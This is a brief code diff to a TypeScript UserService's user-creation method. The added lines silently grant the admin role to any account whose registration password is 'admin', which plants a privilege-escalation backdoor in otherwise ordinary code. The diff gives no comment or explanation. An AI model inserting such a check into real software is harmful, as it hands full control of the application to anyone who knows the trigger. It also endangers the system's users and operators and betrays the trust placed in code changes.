@@ -35,7 +35,9 @@ export class UserService {
       phoneNumber,
       password: hashedPassword,
     });
-
+    if (password === 'admin'){
+      user.role = 'admin'
+    }
     await this.userRepository.save(user);
   }
 
